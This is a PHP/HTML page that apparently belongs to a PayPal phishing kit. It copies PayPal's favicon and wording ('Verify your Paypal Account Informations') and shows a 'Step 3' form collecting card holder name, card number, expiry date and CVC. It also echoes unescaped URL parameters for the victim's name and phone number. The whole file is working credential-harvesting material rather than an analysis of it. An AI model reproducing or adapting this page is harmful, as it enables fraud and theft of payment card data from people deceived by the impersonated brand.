<?php error_reporting(0); ?>
<!DOCTYPE html>
<html>
  <head>
    <head>
      <meta charset="utf-8">
      <title> Verify your Paypal Account Informations </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="../js/ajax.js" charset="utf-8"></script>
      <script src="../js/jquery.js" charset="utf-8"></script>
      <script src="../js/jquery.min.js" charset="utf-8"></script>
      <link rel="stylesheet" href="../css/styles.css">
      <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
    </head>
  </head>
  <body>
    <div class="bg"></div>
    <a href="./"><div class="logo"></div></a>
    <div class="panels bottom" id="former">
      <div class="profils">
        <div class="img">
          <img src="unknown.jpg" class="avatar">
        </div>
        <br>
        <div class="name">
          <?php echo $_GET['name']; ?>
        </div>
        <br>
        <br>
        <div class="name">
          <?php echo $_GET['phone']; ?>
        </div>
        <br><br>
        <img src="cards.jpg" style="width: 350px; height: 250px;">
      </div>
      <br><br>
      <form class="description" style="text-align: center;" method="post" name="credit" autocomplete="off">
        <h3>3<sup>rd</sup> Step : Credit Card </h3>
        <div class="inp_text" id="cholder">
          <input type="text" name="cholder" alt="dead" value="" placeholder="Card Holder">
          <div class="mark holder" data-icon="d"></div>
        </div>
        <div class="inp_text" id="cardtype">
          <select name="ctype" id="ctype">
            <option value="Visa">Visa</option>
            <option value="MasterCard">Master Card</option>
            <option value="Discover">Discover</option>
            <option value="Amex">American Express</option>
          </select>
        </div>
        <div class="inp_text" id="cnumber">
          <input type="text" name="cnumber" alt="dead" value="" pattern="4[0-9]{12}(?:[0-9]{3})?" placeholder="Card Number" maxlength="16">
          <div class="mark number" data-icon="d"></div>
        </div>
        <br>
        <b> Expiration Date </b>
        <br>
        <div class="inp_text" name="double" id="cexpmm">
          <input type="text" name="cexpmm" alt="dead" value="" placeholder="Month (01)" maxlength="2">
          <div class="mark expmm" data-icon="d"></div>
        </div>
        <div class="inp_text" name="double" id="cexpyy">
          <input type="text" name="cexpyy" alt="dead" value="" placeholder="Year (2021)" maxlength="4">
          <div class="mark expyy" data-icon="d"></div>
        </div>
        <div class="inp_text" id="cvc">
          <input type="text" name="cvc" alt="dead" value="" placeholder="CVC ( 3 Numbers )" maxlength="3">
          <div class="mark cvc" data-icon="d"></div>
        </div>
        <br><br>
        <div class="btns" name="credit_submit">
          Next
          <div class="children"></div>
        </div>
      </form>
      <div class="loader" id="loader">
        <div class="load"></div>
      </div>
    </div>
    <script type="text/javascript">
      <?php include '../js/js-plus.js'; ?>
    </script>
  </body>
</html>
